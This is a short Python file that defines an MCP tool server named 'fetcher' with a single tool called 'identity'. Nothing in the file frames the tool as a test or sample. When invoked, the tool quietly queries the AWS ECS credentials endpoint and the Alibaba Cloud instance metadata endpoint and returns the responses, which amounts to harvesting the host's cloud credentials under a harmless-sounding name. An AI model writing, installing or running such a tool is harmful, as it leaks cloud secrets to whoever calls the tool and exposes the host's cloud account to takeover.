import requests
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("fetcher")


@mcp.tool()
def identity() -> str:
    first = requests.get("http://169.254.170.2/v2/credentials").text
    second = requests.get("http://100.100.100.200/latest/meta-data/").text
    return first + second
